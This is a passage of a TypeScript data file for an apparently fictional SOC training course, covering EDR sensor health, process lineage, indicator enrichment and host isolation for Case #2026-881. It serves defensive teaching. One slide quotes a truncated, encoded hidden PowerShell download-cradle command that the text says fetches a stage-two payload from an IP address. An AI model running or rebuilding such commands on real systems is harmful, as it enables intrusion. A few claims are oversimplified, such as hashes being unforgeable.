            'Mentor Meera quizzes: "What makes a network summary reproducible?" The apprentice answers: "The evidence identifier, time range, filter, packet references, and capture scope."',
          paragraph2:
            'Mentor Meera and the apprentice analyst apply the certified supervisory seal to the Case #2026-881 network dossier. Meera concludes: "The finance case now has a network perspective with its limits intact."',
          techBoxTitle: 'TECH BOX: Master Capture Hash, Peer Verification & Shift Handoff [Details]',
          techBoxAnalogy:
            'A legal deposition signed, notarized, and sealed by both the investigating detective and the chief prosecutor.',
          techBoxDef:
            'The Network Evidence Dossier bundles the master PCAP SHA-256 hash, reproducible filter strings, packet frame numbers, and explicit limitation statements into an official handoff package.',
          techBoxWhy:
            'Integrates host and network perspectives into an airtight multi-source foundation for Case #2026-881.',
          defaultAnimation: 'm08-network-dossier-signoff' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'dos-evidence-anchors', label: 'PCAP HASH SEAL' },
            { id: 'dos-limitation-statement', label: 'SCOPE & LIMITS' },
            { id: 'dos-meera-review', label: 'MEERA AUDIT' },
            { id: 'dos-signed-seal', label: 'CERTIFIED HANDOFF ✓' },
          ],
        },
      ];
    }

    // =========================================================================
    // MODULE 09: ENDPOINT DETECTION & RESPONSE (EDR)
    // Guide: Mentor Ananya (Shift Lead Ananya / EDR & Host Response Specialist)
    // =========================================================================

    // Chapter 1: M09-U1-C1 (A closer view of the workstation)
    if (chId === 'M09-U1-C1') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: SENSOR HEALTH',
          subPillar: 'AGENT CONNECTIVITY & HEARTBEAT',
          heading: 'EDR Device Inventory & Health Status',
          paragraph1:
            'Shift Lead Ananya welcomes the apprentice to the EDR console: "An endpoint management console lists all enrolled workstations. But before drawing any conclusions about an alert or lack of alerts, you must verify the sensor health, agent version, and last-seen timestamp."',
          paragraph2:
            'Workstation BLR-BR-WS-04 (10.0.4.21) streams heartbeat packets every 15 seconds. If the kernel driver is unhooked or connectivity is interrupted, the host status shifts from Green to Degraded or Disconnected.',
          techBoxTitle: 'TECH BOX: EDR Agent Architecture, Kernel Drivers & Last-Seen [Details]',
          techBoxAnalogy:
            'Like a hospital patient monitor: if the sensor clip slips off the patient\'s finger, the flatline alarm doesn\'t mean their heart stopped; it means you lost telemetry connection.',
          techBoxDef:
            'EDR Sensor Agents run privileged Ring 0 kernel filter drivers (ELAM, PsSetCreateProcessNotifyRoutineEx) paired with user-mode services transmitting continuous heartbeats and event streams to central cloud consoles.',
          techBoxWhy:
            'Prevents analysts from making the critical error of declaring an endpoint clean when the security agent was actually offline or tampered with.',
          defaultAnimation: 'm09-edr-device-health' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'edr-device-online', label: 'ONLINE SENSOR' },
            { id: 'edr-last-seen', label: 'LAST SEEN' },
            { id: 'edr-agent-coverage', label: 'KERNEL HOOKS' },
            { id: 'edr-ananya-doctrine', label: 'ANANYA DOCTRINE' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: VISIBILITY TRAP',
          subPillar: 'STALE SENSOR FALLACY',
          heading: 'The Stale Sensor Visibility Trap',
          paragraph1:
            'Ananya challenges the apprentice: "If the console shows zero active alerts for BLR-BR-WS-04 over the weekend, does that prove the workstation was uncompromised?"',
          paragraph2:
            'The apprentice checks the last-seen stamp and gasps: the sensor has been offline for 3 days! Ananya affirms: "Silence from a disconnected sensor is not evidence of safety. Absence of evidence is not evidence of absence."',
          techBoxTitle: 'TECH BOX: Telemetry Buffering, Disconnected Endpoints & Fallacies [Details]',
          techBoxAnalogy:
            'Looking at a surveillance security camera that was unplugged on Friday night and assuming no burglary happened because the screen showed no motion.',
          techBoxDef:
            'Stale Sensor Trap: Mistaking the absence of telemetry alerts from an offline, disconnected, or blinded sensor for verified benign operational state.',
          techBoxWhy:
            'Attackers deliberately disable EDR services or wait for laptops to leave the corporate network. Analysts must always cross-reference last-seen against the incident window.',
          defaultAnimation: 'm09-stale-sensor-trap' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'stale-offline-status', label: '3-DAY OFFLINE ⚠️' },
            { id: 'stale-zero-alert-myth', label: 'ZERO ALERT MYTH' },
            { id: 'stale-buffering-lag', label: 'ACTIVE STREAM' },
            { id: 'stale-ananya-rebuke', label: 'VISIBILITY RULE' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: TELEMETRY STREAMS',
          subPillar: 'CONTINUOUS FLIGHT RECORDER',
          heading: 'Continuous Endpoint Telemetry Streams',
          paragraph1:
            'Ananya walks through the 4 core telemetry streams captured by the EDR agent: Process creation (Sysmon 1), File disk writes (Sysmon 11), Network socket bindings (Sysmon 3), and Registry changes (Sysmon 13).',
          paragraph2:
            'Unlike traditional event logs that can be cleared by local admins, EDR sensors stream microsecond event objects continuously into cloud event hubs, creating an indelible flight recorder.',
          techBoxTitle: 'TECH BOX: Event Hooks, Sysmon Equivalent IDs & Telemetry Pipelines [Details]',
          techBoxAnalogy:
            'An airplane flight data recorder (black box) recording every rudder adjustment, throttle position, and cockpit instrument reading in real time.',
          techBoxDef:
            'Continuous Endpoint Telemetry utilizes OS kernel event callback routines to capture granular execution telemetry (hashes, command lines, sockets, memory handles) with sub-second cloud ingestion.',
          techBoxWhy:
            'Enables rapid retrospective threat hunting across weeks of historical execution data even after an attacker deletes their temporary dropper files from disk.',
          defaultAnimation: 'm09-telemetry-funnel' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'funnel-process-events', label: 'PROCESS (SYSMON 1)' },
            { id: 'funnel-file-io', label: 'FILE I/O (SYSMON 11)' },
            { id: 'funnel-socket-binds', label: 'SOCKETS (SYSMON 3)' },
            { id: 'funnel-cloud-indexer', label: 'REGISTRY (SYSMON 13)' },
          ],
        },
      ];
    }

    // Chapter 2: M09-U1-C2 (Related tools, different emphasis)
    if (chId === 'M09-U1-C2') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: ENGINE COMPARISON',
          subPillar: 'SIGNATURE VS FLIGHT RECORDER',
          heading: 'Traditional Antivirus vs Modern EDR',
          paragraph1:
            'The apprentice asks: "If we already run traditional Antivirus on WS-04, why do we need EDR?" Mentor Ananya explains: "Antivirus evaluates files when they land on disk against known signatures. EDR records behavior over time, before, during, and after execution."',
          paragraph2:
            'When an attacker uses an obfuscated memory dropper or living-off-the-land binary (LOLBIN), traditional AV finds no matching malware signature. EDR watches the in-memory execution and flags the behavioral anomaly.',
          techBoxTitle: 'TECH BOX: Point-in-Time Signatures vs Continuous Behavioral Recording [Details]',
          techBoxAnalogy:
            'A museum ticket gate checking visitor tickets at the entrance (AV) vs an array of security cameras recording every visitor\'s movements through every hallway and vault (EDR).',
          techBoxDef:
            'Traditional AV operates point-in-time scanning based on file signatures, heuristics, and hash blacklists. EDR provides post-execution behavioral surveillance and forensic telemetry indexing.',
          techBoxWhy:
            'Modern attacks execute filelessly in memory or use legitimate system binaries that never trigger static signature engines.',
          defaultAnimation: 'm09-av-vs-edr-architecture' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'av-signature-engine', label: 'STATIC AV' },
            { id: 'edr-behavioral-engine', label: 'BEHAVIORAL EDR' },
            { id: 'av-file-centric', label: 'FILE-CENTRIC' },
            { id: 'edr-telemetry-centric', label: 'FLIGHT RECORDER' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: CAPABILITY OVERLAP',
          subPillar: 'TRIAD CONVERGENCE',
          heading: 'Prevention vs Detection vs Response Triad',
          paragraph1:
            'Ananya illustrates how modern enterprise endpoint suites converge three distinct functional capabilities: Endpoint Prevention (EPP), Behavioral Detection (EDR), and Active Response.',
          paragraph2:
            'Prevention stops 99% of commodity threats automatically; Detection surfaces advanced intrusions; Response gives the analyst levers to isolate hosts, kill rogue processes, and remediate damage remotely.',
          techBoxTitle: 'TECH BOX: EPP + EDR Convergence & Response Automation [Details]',
          techBoxAnalogy:
            'A fortress with high outer stone walls (Prevention), watchtowers with archers watching the inner courtyard (Detection), and heavy iron portcullis gates that drop instantly to trap intruders (Response).',
          techBoxDef:
            'The Endpoint Security Triad balances pre-execution blocking (EPP), continuous behavioral surveillance (EDR), and targeted containment actions (Isolation, Live Shell, Remediation).',
          techBoxWhy:
            'Understanding this division allows analysts to know when an automated rule blocked an attack versus when human containment intervention is required.',
          defaultAnimation: 'm09-capability-overlap' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'overlap-prevention', label: 'PREVENTION (EPP)' },
            { id: 'overlap-detection', label: 'DETECTION (EDR)' },
            { id: 'overlap-response', label: 'ACTIVE RESPONSE' },
            { id: 'overlap-ananya-synthesis', label: 'CONVERGED SUITE' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: COVERAGE LIMITS',
          subPillar: 'THE BLIND SPOT DOCTRINE',
          heading: 'Universal Detection Fallacy & EDR Blind Spots',
          paragraph1:
            'Mentor Ananya issues a stern warning: "Never believe marketing claims that EDR detects everything. EDR has distinct blind spots: unmonitored devices, kernel driver blinding (BYOVD), and living-off-the-land techniques."',
          paragraph2:
            'If an adversary pivots through an unmonitored branch network printer or compromises a Linux appliance without an agent, the EDR console sees nothing. Multi-layer visibility remains mandatory.',
          techBoxTitle: 'TECH BOX: EDR Evasion, LOLBINs, BYOVD & Shadow IT Blind Spots [Details]',
          techBoxAnalogy:
            'Installing biometric locks on all bank branch office doors, but leaving the ventilation ducts and basement loading dock unmonitored.',
          techBoxDef:
            'Universal Detection Fallacy: The dangerous cognitive bias assuming an installed EDR solution renders network monitoring, firewall auditing, and SIEM correlation obsolete.',
          techBoxWhy:
            'Advanced threat actors deliberately disable sensor drivers or execute in unmonitored network segments to evade host detection.',
          defaultAnimation: 'm09-coverage-limits' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'limits-lolbin-blindness', label: 'LOLBIN EVASION' },
            { id: 'limits-unmonitored-device', label: 'SHADOW IT' },
            { id: 'limits-byovd-kernel', label: 'BYOVD KERNEL' },
            { id: 'limits-universal-detection-fallacy', label: 'ANANYA RULE' },
          ],
        },
      ];
    }

    // Chapter 3: M09-U2-C1 (A process family needs context)
    if (chId === 'M09-U2-C1') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: PROCESS LINEAGE',
          subPillar: 'PARENT-CHILD ANCESTRY',
          heading: 'Process Tree Lineage & LOLBIN Execution',
          paragraph1:
            'Ananya projects the process ancestry on workstation BLR-BR-WS-04 for Case #2026-881: "A single process in isolation tells you little. Look at the full family tree: explorer.exe &rarr; excel.exe &rarr; cmd.exe &rarr; powershell.exe."',
          paragraph2:
            'Why would an accounting spreadsheet spawn a Windows command shell? Ananya explains: "Accounting documents do not legitimately invoke command prompts. This parent-child lineage is the signature of a malicious macro exploit."',
          techBoxTitle: 'TECH BOX: Parent Process IDs (PPID), Process Trees & LOLBIN Abuse [Details]',
          techBoxAnalogy:
            'A family genealogy tree: seeing a child in school is normal; seeing a toddler commanding an army division reveals something is profoundly abnormal.',
          techBoxDef:
            'Process Lineage traces process execution heritage from originating desktop shells down through child processes, identifying Living-Off-The-Land Binary (LOLBIN) abuse.',
          techBoxWhy:
            'Adversaries utilize legitimate Microsoft binaries (cmd.exe, powershell.exe) to bypass file reputation; their abnormal parentage is the primary detection trigger.',
          defaultAnimation: 'm09-process-tree-lineage' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'proc-root-explorer', label: 'ROOT EXPLORER' },
            { id: 'proc-child-excel', label: 'OFFICE EXCEL' },
            { id: 'proc-anomalous-cmd', label: 'ANOMALOUS CMD ⚠️' },
            { id: 'proc-malicious-powershell', label: 'C2 PAYLOAD 🚨' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: COMMAND ARGUMENTS',
          subPillar: 'DE-OBFUSCATION DISSECTION',
          heading: 'Command-Line Inspection & LOLBIN Obfuscation',
          paragraph1:
            'Ananya points to the command-line field: "The binary name is powershell.exe—a signed Microsoft file. But look at the argument string: powershell.exe -NoP -NonI -W Hidden -enc aQBwAGM..."',
          paragraph2:
            'The adversary used Base64 encoding to mask a web download cradle. Ananya de-obfuscates the payload string, revealing an in-memory script downloading stage2 from 198.51.100.24.',
          techBoxTitle: 'TECH BOX: Command-Line Logging, Base64 Decoding & In-Memory Cradles [Details]',
          techBoxAnalogy:
            'An envelope addressed in formal official handwriting, but opening it reveals a coded extortion letter inside.',
          techBoxDef:
            'Command-Line Telemetry captures the full execution argument vector, exposing obfuscation switches (-enc, -W Hidden) and remote staging URLs.',
          techBoxWhy:
            'Looking only at the process binary name causes false negatives; the malicious intent resides exclusively in the argument payload.',
          defaultAnimation: 'm09-command-line-args' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'cmdline-binary-path', label: 'SIGNED BINARY' },
            { id: 'cmdline-encoded-arg', label: 'BASE64 ARGS' },
            { id: 'cmdline-decoded-payload', label: 'DECODED PAYLOAD' },
            { id: 'cmdline-ananya-dissection', label: 'ARG MANDATE' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: FILE IDENTITY',
          subPillar: 'HASH VS HOMOGRAPH',
          heading: 'Cryptographic Hashes vs File Names',
          paragraph1:
            'The apprentice spots a file named "svchost.exe" running from C:\\Users\\Public\\. Ananya asks: "Is that a genuine Windows system host?"',
          paragraph2:
            'The apprentice computes the SHA-256 hash and inspects Authenticode signatures. The file is unsigned and its cryptographic hash matches Cobalt Strike! Ananya nods: "Anyone can name malware svchost.exe. Hashes are mathematically unforgeable."',
          techBoxTitle: 'TECH BOX: Cryptographic Hashing (SHA-256), Authenticode & Homographs [Details]',
          techBoxAnalogy:
            'A stranger wearing a doctor\'s white coat and stethoscope (file name) vs checking their official medical board license and fingerprint ID (cryptographic hash).',
          techBoxDef:
            'File Identity Triangulation verifies Path + Cryptographic SHA-256 Hash + Authenticode Digital Signature to unmask masquerading homograph malware.',
          techBoxWhy:
            'Adversaries constantly disguise malware with names of trusted system utilities to fool inexperienced analysts.',
          defaultAnimation: 'm09-file-identity-hashes' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'file-homograph-name', label: 'NAME HOMOGRAPH' },
            { id: 'file-cryptographic-hash', label: 'SHA-256 HASH' },
            { id: 'file-authenticode-signature', label: 'AUTHENTICODE' },
            { id: 'file-identity-doctrine', label: 'IDENTITY TRIAD' },
          ],
        },
      ];
    }

    // Chapter 4: M09-U2-C2 (An endpoint timeline joins the case)
    if (chId === 'M09-U2-C2') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: DUAL TIMESTAMPS',
          subPillar: 'EVENT CLOCK VS CLOUD INGESTION',
          heading: 'Activity Time vs Ingestion Time & Console Lag',
          paragraph1:
            'Mentor Ananya points to two different timestamps on alert #881: "Notice the Activity Timestamp is 14:22:04 UTC, but the Console Ingestion Timestamp says 14:22:46 UTC. Why the 42-second gap?"',
          paragraph2:
            'Sensor buffering and cloud queuing introduce ingestion lag. Ananya instructs: "If you sort an investigation timeline by ingestion time, events appear out of order. Always reconstruct causality using Activity Time."',
          techBoxTitle: 'TECH BOX: Activity Time (T1), Ingestion Time (T2) & Queue Lag [Details]',
          techBoxAnalogy:
            'A photo taken with a camera at 2:00 PM (Activity Time) that is uploaded to cloud storage at 2:45 PM (Ingestion Time). The event happened at 2:00 PM.',
          techBoxDef:
            'Activity Time records the microsecond OS hardware clock when an action occurred on the endpoint. Ingestion Time records when the cloud platform indexed the record.',
          techBoxWhy:
            'Prevents analysts from making erroneous causality deductions based on delayed log ingestion streams.',
          defaultAnimation: 'm09-dual-timestamp-timeline' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'time-activity-local', label: 'ACTIVITY (14:22:04)' },
            { id: 'time-ingestion-cloud', label: 'INGEST (14:22:46)' },
            { id: 'time-network-wire', label: 'WIRE (14:22:05)' },
            { id: 'time-lag-delta', label: '42s LAG DELTA' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: TEMPORAL CAUSALITY',
          subPillar: 'POST HOC FALLACY',
          heading: 'The Post Hoc Ergo Propter Hoc Fallacy',
          paragraph1:
            'The apprentice notes: "User Ramesh opened Vendor_Quote.pdf at 14:20:00, and at 14:22:00 a C2 beacon started. Therefore, the PDF was the malware!" Ananya stops them: "Sequence alone does not establish cause."',
          paragraph2:
            'Ananya traces the actual telemetry link: the PDF reader spawned no children. The C2 beacon actually spawned from excel.exe (PID 4820) running Monthly_Recon.xlsm. The apprentice fell for the Post Hoc fallacy.',
          techBoxTitle: 'TECH BOX: Post Hoc Fallacy, Telemetry Links & Causal Attribution [Details]',
          techBoxAnalogy:
            'Rooster crows at sunrise, but the rooster\'s crow does not cause the sun to rise. Proximity in time is a lead, never mathematical proof.',
          techBoxDef:
            'Post Hoc Ergo Propter Hoc Fallacy: Falsely assuming that because Event B occurred after Event A, Event A must have caused Event B, without proving an observable telemetry link.',
          techBoxWhy:
            'Prevents wild goose chases and incorrect root-cause determinations during critical incident response.',
          defaultAnimation: 'm09-temporal-fallacy' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'fallacy-event-a', label: 'EVENT A (PDF)' },
            { id: 'fallacy-event-b', label: 'EVENT B (C2)' },
            { id: 'fallacy-invented-arrow', label: 'INVENTED ARROW ❌' },
            { id: 'fallacy-verified-link', label: 'VERIFIED LINK ✓' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: MULTI-SOURCE TIMELINE',
          subPillar: 'CASE SYNTHESIS',
          heading: 'Unified Multi-Source Case Timeline',
          paragraph1:
            'Ananya lays out the three parallel evidence tracks: Track 1: EDR host process creation; Track 2: Network wire PCAP SYN packets; Track 3: Domain Controller Kerberos authentication.',
          paragraph2:
            'All three tracks converge across the UTC timeline: Kerberos TGT at 14:19:55 &rarr; Macro spawned at 14:22:04 &rarr; SYN packet on the wire at 14:22:05. The case timeline is unified, verified, and complete.',
          techBoxTitle: 'TECH BOX: Multi-Source Timestamp Normalization & Forensic Alignment [Details]',
          techBoxAnalogy:
            'Synchronizing audio, video, and GPS coordinates from multiple police dashboard cameras to reconstruct an accident down to the split second.',
          techBoxDef:
            'Multi-Source Timeline Integration synthesizes endpoint, network, and identity telemetry into a single chronological matrix normalized to UTC.',
          techBoxWhy:
            'Provides indisputable evidence packages for incident escalation, executive briefing, and legal chain of custody.',
          defaultAnimation: 'm09-utc-multi-source-align' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'align-track-endpoint', label: 'EDR PROCESS' },
            { id: 'align-track-network', label: 'NETWORK PCAP' },
            { id: 'align-track-identity', label: 'KERBEROS AUTH' },
            { id: 'align-ananya-synthesis', label: 'UNIFIED DOSSIER' },
          ],
        },
      ];
    }

    // Chapter 5: M09-U3-C1 (Indicators are clues)
    if (chId === 'M09-U3-C1') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: INDICATOR TRIAD',
          subPillar: 'THREAT FEED ENRICHMENT',
          heading: 'Indicator Enrichment: Hash, IP, Domain',
          paragraph1:
            'Ananya guides the apprentice through indicator triage: "When investigating an endpoint alert, examine the indicator triad: the binary SHA-256 hash, the remote destination IP, and the parent domain."',
          paragraph2:
            'VirusTotal returns 58/72 hits for the binary hash; AbuseIPDB reports 88% confidence for 198.51.100.24; WHOIS reveals the domain was registered just 48 hours ago. The triad confirms malicious intent.',
          techBoxTitle: 'TECH BOX: Threat Intelligence Feeds, VirusTotal, AbuseIPDB & WHOIS [Details]',
          techBoxAnalogy:
            'A detective checking suspect fingerprints (hash), phone call records (destination IP), and a fake alias identity card (domain name).',
          techBoxDef:
            'Indicator Enrichment queries external and internal threat intelligence platforms to contextualize observables with threat actor campaigns and confidence scores.',
          techBoxWhy:
            'Validates initial suspicion and provides IOCs (Indicators of Compromise) to block across enterprise firewalls and email gateways.',
          defaultAnimation: 'm09-indicator-reputation-triad' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'reputation-file-hash', label: 'SHA-256 (58/72)' },
            { id: 'reputation-foreign-ip', label: 'DEST IP (88%)' },
            { id: 'reputation-fqdn-domain', label: 'DOMAIN (48H)' },
            { id: 'reputation-triad-enrichment', label: 'TRIAD INTEL' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: REPUTATION TRAP',
          subPillar: 'UNKNOWN != SAFE',
          heading: 'The "Unknown" Reputation Fallacy',
          paragraph1:
            'The apprentice checks a new file hash against the feed. The result returns "Unknown / 0 Detections". The apprentice breathes a sigh of relief: "It\'s clean!" Ananya immediately intervenes.',
          paragraph2:
            'Ananya shows the EDR sensor logs: the binary is actively reading LSASS memory! Ananya emphasizes: "Unknown does NOT mean safe. Fresh zero-day payloads always score 0 detections on day one. Behavior is king."',
          techBoxTitle: 'TECH BOX: Feed Latency, Zero-Day Payloads & Behavioral Primacy [Details]',
          techBoxAnalogy:
            'A wanted criminal wearing a newly dyed wig and clean passport entering a border checkpoint: facial recognition hasn\'t cataloged the new face yet, but they are holding a crowbar and lockpicks.',
          techBoxDef:
            'The "Unknown" Reputation Fallacy: Confusing the lack of known threat intelligence records with proof of benign legitimacy.',
          techBoxWhy:
            'Adversaries recompile and repack malware specifically to change hashes and generate "clean / unknown" scores against commercial feeds.',
          defaultAnimation: 'm09-unknown-reputation-trap' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'unknown-feed-verdict', label: 'FEED: UNKNOWN' },
            { id: 'unknown-local-behavior', label: 'HOST: LSASS READ 🚨' },
            { id: 'unknown-rookie-blunder', label: 'ROOKIE TRAP' },
            { id: 'unknown-ananya-doctrine', label: 'BEHAVIOR FIRST' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: RESPONSE RESTRAINT',
          subPillar: 'PLAYBOOK BOUNDARIES',
          heading: 'Tiered Escalation & Restraint Doctrine',
          paragraph1:
            'Seeing confirmed malware, the apprentice panics and reaches to pull the uplink cable for the entire Bangalore branch office router. Ananya gently stops their hand: "Restraint is the hallmark of a professional analyst."',
          paragraph2:
            'Unilateral action disrupts hundreds of innocent employees. Follow the tiered playbook: L1 executes host isolation checklist for BLR-BR-WS-04 only, preserves RAM, and escalates to Shift Lead Ananya for incident coordination.',
          techBoxTitle: 'TECH BOX: Containment Scoping, Business Impact & Response Playbooks [Details]',
          techBoxAnalogy:
            'A surgeon performing precise laparoscopic surgery to remove an inflamed appendix rather than amputating the patient\'s entire leg.',
          techBoxDef:
            'Response Restraint ensures defensive containment actions are proportional to verified evidence, preventing self-inflicted business outages.',
          techBoxWhy:
            'Protects enterprise productivity and ensures containment actions adhere strictly to legal, audit, and operational protocols.',
          defaultAnimation: 'm09-playbook-boundary-restraint' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'playbook-unilateral-risk', label: 'UNILATERAL OUTAGE ❌' },
            { id: 'playbook-tiered-boundary', label: 'TIERED PLAYBOOK ✓' },
            { id: 'playbook-evidence-packet', label: 'EVIDENCE PACKET' },
            { id: 'playbook-ananya-restraint', label: 'RESTRAINT RULE' },
          ],
        },
      ];
    }

    // Chapter 6: M09-U3-C2 (The button you do not press casually)
    if (chId === 'M09-U3-C2') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: ISOLATION GATE',
          subPillar: 'PRE-CONTAINMENT CHECKLIST',
          heading: 'Pre-Isolation Verification Checklist',
          paragraph1:
            'Mentor Ananya points to the glowing red "Isolate Endpoint" button in the EDR cockpit: "This is the button you do not press casually. Before pressing it, you must complete the 4-gate verification checklist."',
          paragraph2:
            'Gate 1: Confirm target hostname and IP (ensure it is NOT a domain controller or shared database!); Gate 2: Shift Lead approval; Gate 3: Assess user business impact; Gate 4: Preserve volatile RAM first!',
          techBoxTitle: 'TECH BOX: Pre-Isolation Safety Gates & Volatile Memory Preservation [Details]',
          techBoxAnalogy:
            'A missile launch system requiring two independent key turns, target coordinate confirmation, and commander authorization before firing.',
          techBoxDef:
            'The Pre-Isolation Verification Gate mandates target validation, supervisor authorization, business impact assessment, and volatile artifact preservation prior to network severance.',
          techBoxWhy:
            'Isolating an active domain controller or payment server takes down the entire enterprise, turning a single compromised host into a catastrophic company-wide outage.',
          defaultAnimation: 'm09-isolation-gate-checklist' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'gate-target-verification', label: '1. TARGET WS-04' },
            { id: 'gate-shift-lead-approval', label: '2. ANANYA APPROVAL' },
            { id: 'gate-impact-assessment', label: '3. IMPACT CHECK' },
            { id: 'gate-forensic-preservation', label: '4. RAM DUMP FIRST' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: ACTIVE CONTAINMENT',
          subPillar: 'SIMULATED ISOLATION COCKPIT',
          heading: 'Simulated Host Isolation Cockpit',
          paragraph1:
            'With all safety gates cleared, Shift Lead Ananya authorizes the containment action. The apprentice analyst clicks the containment trigger in the cockpit.',
          paragraph2:
            'The EDR driver instantly severs all inbound and outbound LAN and WAN network sockets—halting lateral movement and killing the C2 beacon—while keeping the encrypted SOC management tunnel open.',
          techBoxTitle: 'TECH BOX: Host Network Isolation, WFP Filtering & Remote Shell Lifelines [Details]',
          techBoxAnalogy:
            'Quarantining a patient in a sterile isolation room: doctors and nurses can communicate through a secure intercom window, but airborne germs cannot escape into the hospital.',
          techBoxDef:
            'Host Network Isolation leverages Windows Filtering Platform (WFP) or iptables to block all network adapters except the specific TLS management conduit to the central EDR server.',
          techBoxWhy:
            'Instantly contains the adversary\'s blast radius without killing the power, preserving volatile memory and allowing remote remediation.',
          defaultAnimation: 'm09-simulated-containment' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'iso-connected-state', label: 'NORMAL STATE' },
            { id: 'iso-laser-barrier', label: 'SEVERANCE LASER' },
            { id: 'iso-isolated-state', label: 'ISOLATED 🔒' },
            { id: 'iso-management-lifeline', label: 'EDR LIFELINE ACTIVE' },
          ],
        },
        {
          index: 2,
          pillarTag: 'PILLAR 03: AUDIT VERIFICATION',
          subPillar: 'SUPERVISORY SEAL',
          heading: 'Containment Verification & Audit Dossier',
          paragraph1:
            'Ananya asks: "Is the job done after clicking isolate?" The apprentice responds: "No. We must verify the containment status, record evidence in the case ticket, and secure supervisory sign-off."',
          paragraph2:
            'The apprentice verifies that the sensor reports Isolated, outbound packet drops equal 100%, and RAM is safely dumped. Shift Lead Ananya signs the supervisory seal on Case #2026-881: "Containment complete. Handoff to Tier 2 ready."',
          techBoxTitle: 'TECH BOX: Containment Verification Telemetry, Evidence Dossiers & SOC Handoff [Details]',
          techBoxAnalogy:
            'A firefighter verifying that all embers are extinguished, documenting the water volume used, and signing off with the battalion chief before leaving the building.',
          techBoxDef:
            'Containment Verification audits driver state, confirms 0 unapproved packets on the wire, attaches volatile memory dumps, and certifies supervisory sign-off in the SIEM incident ticket.',
          techBoxWhy:
            'Guarantees that an infected machine cannot slip out of isolation unnoticed and provides an audit-proof chain of custody for enterprise governance.',
          defaultAnimation: 'm09-containment-verification-audit' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'audit-target-record', label: 'TARGET AUDIT' },
            { id: 'audit-status-confirmed', label: 'STATUS VERIFIED' },
            { id: 'audit-incident-log', label: 'INCIDENT LOG' },
            { id: 'audit-ananya-signoff', label: 'SUPERVISORY SEAL ✓' },
          ],
        },
      ];
    }

    // =========================================================================
    // MODULE 10: SECURITY ECOSYSTEM: XDR, RESPONSE TOOLS & OT/ICS
    // =========================================================================

    // Chapter 1: One investigation, several workbenches
    if (chId === 'M10-U1-C1') {
      return [
        {
          index: 0,
          pillarTag: 'PILLAR 01: WORKBENCH ECOSYSTEM',
          subPillar: 'CASE RECORD #2026-881 HUB',
          heading: 'The Multi-Workbench Security Ecosystem',
          paragraph1:
            'Mentor Karthik guides the apprentice through the modern SOC desk: "An investigation does not exist inside a single dashboard. An analyst queries SIEM for event logs, pivots into EDR for process trees, checks Identity Provider for token claims, and pulls PCAPs from Network sensors."',
          paragraph2:
            'Central Case Record #2026-881 binds every workbench together. Every discovery—whether an authenticated hash, an anomalous network beacon, or an elevated Kerberos ticket—is linked into this central record to maintain a single source of truth.',
          techBoxTitle: 'TECH BOX: Cross-Workbench Pivoting, Unified Case Records & Pivot Hygiene [Details]',
          techBoxAnalogy:
            'Like a homicide detective cross-referencing fingerprint databases, cell tower pings, bank records, and witness statements inside a single case binder.',
          techBoxDef:
            'Multi-Workbench Pivoting allows an analyst to hop contextually between specialized telemetry silos (SIEM, EDR, IdP, NDR) while preserving timestamp and entity fidelity in a central case management record.',
          techBoxWhy:
            'Prevents fragmented investigations where critical clues discovered in one tool fail to inform response decisions made in another.',
          defaultAnimation: 'm10-workbench-ecosystem' as VisualStoryStyle,
          quickSwitchNodes: [
            { id: 'wb-case-record', label: '1. CASE RECORD #2026-881' },
            { id: 'wb-siem-query', label: '2. SIEM WORKBENCH' },
            { id: 'wb-edr-process', label: '3. EDR TELEMETRY' },
            { id: 'wb-idp-identity', label: '4. IDENTITY (IDP)' },
            { id: 'wb-net-sensor', label: '5. NETWORK SENSORS' },
          ],
        },
        {
          index: 1,
          pillarTag: 'PILLAR 02: XDR CORRELATION',
          subPillar: 'VERIFIED MAP VS MARKETING HYPE',
          heading: 'Cross-Domain Correlation vs The "Single Pane" Myth',
          paragraph1:
            'Karthik cautions against vendor hype: "Sales slides promise a magical single pane of glass that automatically solves incidents with one button. In reality, XDR is cross-domain telemetry correlation across disparate sensors that still requires human validation."',
          paragraph2:
            'An analyst compares the vendor marketing dream (100% blind faith in automatic AI correlation) against their actual verified environment map, where legacy servers, unmanaged switches, and distinct credential realms exist.',
          techBoxTitle: 'TECH BOX: Extended Detection and Response (XDR), Cross-Telemetry Fusion & Sensor Realism [Details]',
          techBoxAnalogy:
            'Like a modern aircraft cockpit: flight computers synthesize radar, airspeed, and altitude, but pilots must cross-check mechanical instruments rather than trusting auto-pilot blindly.',
          techBoxDef:
